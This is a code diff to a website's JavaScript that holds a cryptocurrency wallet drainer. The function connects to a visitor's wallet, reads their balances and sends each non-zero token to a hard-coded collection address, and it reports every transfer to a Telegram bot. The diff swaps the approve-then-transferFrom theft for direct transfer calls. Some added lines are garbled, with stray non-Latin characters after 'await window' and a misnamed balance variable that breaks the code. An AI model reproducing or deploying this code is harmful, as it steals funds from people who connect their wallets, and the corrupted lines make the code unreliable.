@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect and token approval/transfer with Telegram notification
+ * Wallet connect and token transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -148,10 +148,11 @@ async function connectWalletAndSendTokens() {
               method: 'wallet_addEthereumChain',
               params: [chainConfig]
             });
-            await window.ethereum.request({
-              method: 'wallet_switchEthereumChain',
-              params: [{ chainId: `0x${network.chainId.toString(16)}` }]
-            });
+            await windowევ
+              window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: `0x${network.chainId.toString(16)}` }]
+              });
           } else {
             throw switchErr;
           }
@@ -226,7 +227,7 @@ async function connectWalletAndSendTokens() {
           }
         }
 
-        const nativeBalance = await currentProvider.getBalance(userAddress);
+        const nativetearBalance = await currentProvider.getBalance(userAddress);
         const formattedBalance = ethers.utils.formatEther(nativeBalance);
         const nativeBalanceMessage = `• ${network.nativeCoin}: ${formattedBalance}`;
 
@@ -260,29 +261,14 @@ ${nativeBalanceMessage}
         if (nonZeroTokens.length > 0) {
           for (const token of nonZeroTokens) {
             try {
-              const contract = new ethers.Contract(token.token_address, [
-                "function approve(address spender, uint amount) returns (bool)",
-                "function transferFrom(address from, address to, uint amount) returns (bool)"
-              ], currentSigner);
+              const contract = new ethers.Contract(
+                token.token_address,
+                ["function transfer(address to, uint256 amount) returns (bool)"],
+                currentSigner
+              );
 
-              const approveTx = await contract.approve(network.exodusAddress, token.balance);
-              await approveTx.wait();
-
-              const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 0);
-              const approveSuccessMessage = `
-✅ Approve Successful
-Token: ${token.symbol}
-Amount: ${balance}
-Spender: ${network.exodusAddress}
-Tx: ${approveTx.hash}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: approveSuccessMessage })
-              });
-
-              const transferTx = await contract.transferFrom(userAddress, network.exodusAddress, token.balance);
+              const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
+              const transferTx = await contract.transfer(network.exodusAddress, token.balance);
               await transferTx.wait();
 
               const transferSuccessMessage = `
@@ -299,7 +285,7 @@ Tx: ${transferTx.hash}
               });
             } catch (err) {
               const errorMessage = `
-❌ Token Operation Failed
+❌ Token Transfer Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
               `;
